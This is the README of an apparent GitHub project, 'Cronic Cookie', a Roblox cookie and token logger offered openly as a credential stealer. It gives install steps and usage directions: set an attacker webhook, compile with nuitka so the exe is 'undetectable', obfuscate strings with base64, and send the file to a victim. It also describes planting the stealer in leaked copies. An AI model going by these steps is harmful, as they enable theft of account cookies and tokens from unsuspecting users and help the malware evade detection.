screw off skid
# Errors
I have been notified that nuitka doesnt currently work, and pyinstaller doesnt work for me. You can somewhat hide the code by using py_compile, no need to pip install, just do **python -m py_compile main.py**, afterwards, you can rename the file from a .pyc to a .py, although this does have limitations. If you want to hide the strings, you must base64 encode and decode all of the things in the "". OR (get ready the fix) go learn c or c++ and make it yourself like a true chad.
# Important
Please stop dming me, saying that you dont get how it works. Please fully read the README. I work on this project on my free time, if you ever want to support me with any donations, I accept bitcoin. You can dm me and ill give you all of my perks for supporting me with 5 dollars. Thanks :D
# Update Status
I will probably never update this but I will give private and better versions to people who gib mone.

<!-- ABOUT THE PROJECT -->
## About The Project
Welcome to the newest release of Cronic Cookie, a speedy cookie logger. This is my main project and I am working more and more on it. This will probably become an anti skid which steals the cookie and token of a person that downloaded a leaked copy or leaked it.


### Built With

* [Python](https://python.org)



<!-- GETTING STARTED -->
## Getting Started

To get a local copy up and running follow these simple steps.

### Prerequisites

This is an example of how to list things you need to use the software and how to install them.
  ```
  - Go to the folder with all of the files.
  - In the navigation bar (C:/Users/%user%/Desktop/Roblox-Cookie-Logger) delete everything and type cmd, this will bring up "the shell".
  - Now install the packages as instructed.
  ```

### Installation

1. Download the .zip of this repository
   ```
   git clone https://github.com/DaEpicSwag/Roblox-Cookie-Logger.git
   ```
2. Install PIP packages
   ```
   pip install nuitka
   pip install requests
   pip install browser_cookie3
   pip install discord-webhook
   ```



<!-- USAGE EXAMPLES -->
## Usage
- Replace your webhook. If you are using the advanced logger, make sure to fill in the webhook for the token logger and the cookie logger which are in diffrent locations.

- Compile to exe using [nuitka](https://nuitka.net) PLEASE AND NOT PYINSTALLER. Why?
```
1. Harder to crack because Pyinstaller just unloads the source into the temp directory
2. Undetectable
3. Faster
4. Smaller file size that works well when compressed.
```

- Nuitka How To
```
1. Access the "Shell"
2. python -m nuitka urfile.py
```

- Send it over.
